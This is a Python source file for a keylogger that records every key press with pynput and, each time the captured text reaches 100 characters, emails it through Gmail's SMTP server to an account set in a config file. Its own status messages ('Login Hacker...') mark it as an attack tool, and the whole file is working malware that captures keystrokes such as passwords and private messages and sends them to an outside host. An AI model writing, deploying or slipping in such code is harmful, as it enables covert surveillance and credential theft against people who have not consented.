from pynput.keyboard import Key, Listener
from config import Config as config
import email, smtplib



# setup email
email = config.MAIL_USERNAME
password = config.MAIL_PASSWORD
print("Connecting to gmail server...")
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
print('Login Hacker...')
server.login(email, password)
print('Hacker logged in.')


# logger
full_log = ''
word = ''
email_char_limit = 100

# Capture key presses
def on_press(key):
    
    global word
    global full_log
    global email
    global email_char_limit

    # Add spaces for spacebar clicks and enter keys
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        # Send mail when the number of characters reaches the maximum mailable characters
        if len(full_log) >= email_char_limit:
            print(full_log)
            send_mail()
            full_log = ''
    # delete characters of backspace clicks
    elif key == Key.backspace:
        word = word[:-1]
    #  Ignow shift keys
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # Append characters to form readable words
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    # Escape cancels keylog operation and returns to menu
    if key == Key.esc:
        return False

# send full logs to mail
def send_mail():
    server.sendmail(email, email, full_log)


def keylogger():
    # Keylog operation
    with Listener(on_press=on_press) as listener:
        listener.join()
